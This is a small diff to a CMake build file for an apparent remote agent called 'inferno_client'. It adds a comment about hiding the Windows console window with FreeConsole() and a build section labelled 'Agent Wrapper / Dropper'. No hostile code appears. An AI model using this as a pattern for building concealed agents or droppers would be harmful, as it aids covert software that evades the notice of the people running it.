@@ -96,6 +96,9 @@ endif()
 
 if(WIN32)
     target_link_libraries(inferno_client PRIVATE ws2_32 advapi32 user32)
+    # Note: WIN32_EXECUTABLE is intentionally NOT set — the agent uses
+    # FreeConsole() at runtime to hide the console window, keeping
+    # standard main() as the entry point for cross-platform compatibility.
 endif()
 
 # ==========================================
@@ -134,3 +137,8 @@ if(WIN32)
 endif()
 
 add_test(NAME CoreNetworkingTests COMMAND inferno_tests)
+
+# ==========================================
+# 6. Agent Wrapper / Dropper (Phase 2.3)
+# ==========================================
+add_subdirectory(wrapper)
